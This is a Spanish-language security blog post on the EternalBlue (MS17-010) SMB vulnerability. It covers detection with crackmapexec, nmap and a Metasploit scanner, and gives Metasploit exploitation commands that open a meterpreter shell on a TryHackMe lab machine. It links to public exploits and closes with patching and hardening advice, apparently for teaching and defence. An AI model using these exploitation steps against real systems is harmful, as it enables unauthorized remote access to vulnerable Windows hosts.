---
layout: single
title: Eternal Blue
excerpt: "El post aborda la preocupante vulnerabilidad asociada con EternalBlue, un exploit utilizado para propagar malware, como WannaCry. En este análisis, nos enfocamos en proporcionar una guía detallada sobre la identificación y mitigación de esta amenaza, destacando las consecuencias potencialmente devastadoras que puede tener en los sistemas.

Exploramos los métodos para identificar y expotar la vulnerabilidad de EternalBlue en un sistema, analizando sus características distintivas y comportamientos asociados. Además, el post ofrece soluciones efectivas para solventar esta vulnerabilidad, detallando pasos prácticos que los administradores y usuarios pueden seguir para proteger sus sistemas contra posibles ataques.

Al comprender la gravedad de la amenaza y adoptar medidas proactivas, los lectores podrán fortalecer la seguridad de sus sistemas, reduciendo significativamente el riesgo de explotación de EternalBlue. Este análisis también resalta la importancia de abordar de manera sistemática las vulnerabilidades conocidas, subrayando su impacto potencial y la necesidad de una respuesta rápida y efectiva para garantizar la integridad y la seguridad de los sistemas informáticos"
date: 2023-12-29
classes: wide
header:
  teaser: /assets/images/vuln_eternal_blue/Logo.png
  teaser_home_page: true
  icon: /assets/images/vuln.png
categories:
  - Vulnerabilidad
  - Windows
tags:  
  - vulnerabilidad
  - windows
  - EternalBlue
  - metasploit
  - nmap
---

![](/assets/images/vuln_eternal_blue/Logo.png)

# Definición

EternalBlue es un conjunto de vulnerabilidades en el software de Microsoft y, al mismo tiempo, un exploit desarrollado por la Agencia de Seguridad Nacional (NSA) como herramienta de ciberataque. Oficialmente denominado MS17-010 por Microsoft, este exploit impacta exclusivamente a los sistemas operativos Windows. Sin embargo, cualquier dispositivo que utilice el protocolo de intercambio de archivos SMBv1 (Server Message Block versión 1) se encuentra técnicamente en riesgo de ser blanco de ransomware y otros tipos de ciberataques.

Esta vulnerabilidad posibilita que un atacante obtenga acceso remoto a la máquina afectada, lo que implica un riesgo significativo para la seguridad de los sistemas. En términos más simples, EternalBlue se convierte en una herramienta peligrosa que puede ser explotada para comprometer la integridad y privacidad de los sistemas informáticos que utilizan versiones vulnerables del software de Microsoft.

# Identificación 

Existen diferentes formas de poder escanear y identificar la vulnerabilidad de eternal blue la primera forma es con 

```bash
crackmapexec smb ip
```

si este nos devuelve e **SMBv1** en true significa que puede que el host sea vulnerable a eternal blue

![](/assets/images/vuln_eternal_blue/1.png)


si deseas comprobar  comprobar con otra herramienta si es vulnerable puedes hacerlo con la herramienta de nmap con el siguiente comando

```bash
nmap -p445 -sCV --script="vuln and safe" ip
```

si la maquina es vulnerable te saldrá lo siguiente

![](/assets/images/vuln_eternal_blue/2.png)

también puedes utilizar metasploit para escanear un host y verificar si este es vulnerable

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

donde configuramos el scanner para que tome como host la ip de la victima 

```bash
set RHOSTS 10.10.174.11
```
![](/assets/images/vuln_eternal_blue/3.png)

y ponemos a correr el escáner 

```bash
run
```

![](/assets/images/vuln_eternal_blue/4.png)


# Explotación

para la explotacion utilizamos el modulo de **ms17_010_eternalblue** de metasploit ,donde cambiaremos el **rhosts** por la ip de la victima y cambiamos el **lhost** por nuestra ip

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS victim_ip
set lhost our_ip
```
y para hacer la escala de privilegios como pide tryhackme cambiamos el payload por el siguiente

```bash
set payload windows/x64/meterpreter/bind_tcp
```

![](/assets/images/vuln_eternal_blue/5.png)

ahora ejecutamos el exploit y podemos ver que obtenemos una shell con la maquina victima 

```bash
run
```
![](/assets/images/vuln_eternal_blue/6.png)


también en exploit db podemos encontrar exploit para aprovechar esta vulnerabilidad:
- [Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) - Windows remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/42315)
- [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) - Windows remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/42031)


# Maquinas para practicar

- [Blue tryhackme](/tryhackme-writeup-blue)


# Solventar  Eternal Blue

1. **Actualiza tu Sistema Operativo:**
	- Asegúrate de que tu sistema operativo Windows esté completamente actualizado con los últimos parches de seguridad. Puedes hacer esto a través de Windows Update.
1. **Instala el Parche de Seguridad MS17-010:**
    - El parche de seguridad MS17-010 aborda específicamente la vulnerabilidad EternalBlue. Asegúrate de haber instalado este parche en tu sistema. Puedes encontrar este parche en el sitio web oficial de Microsoft o a través de Windows Update.
3. **Utiliza un Antivirus y Software de Seguridad:**
    - Mantén un software antivirus y otras herramientas de seguridad actualizados para detectar y prevenir posibles amenazas.
4. **Firewall y Configuración de Red:**
    - Configura un firewall adecuado para bloquear el tráfico no deseado y limitar el acceso a los servicios innecesarios. Además, segmenta tu red para reducir el riesgo de propagación.
5. **Monitorización y Detección de Amenazas:**
    - Implementa herramientas de monitoreo y detección de amenazas para identificar posibles intentos de explotación de vulnerabilidades.
6. **Auditoría de Seguridad:**
    - Realiza auditorías de seguridad periódicas para identificar y abordar posibles debilidades en tu infraestructura.
7. **Considera Desactivar SMBv1:**
    - Si no es necesario, considera desactivar el protocolo SMBv1, ya que EternalBlue se aprovecha de vulnerabilidades en este protocolo. Sin embargo, ten en cuenta que desactivar SMBv1 puede afectar la compatibilidad con sistemas más antiguos que dependen de este protocolo.

# Referencias
- https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
- https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

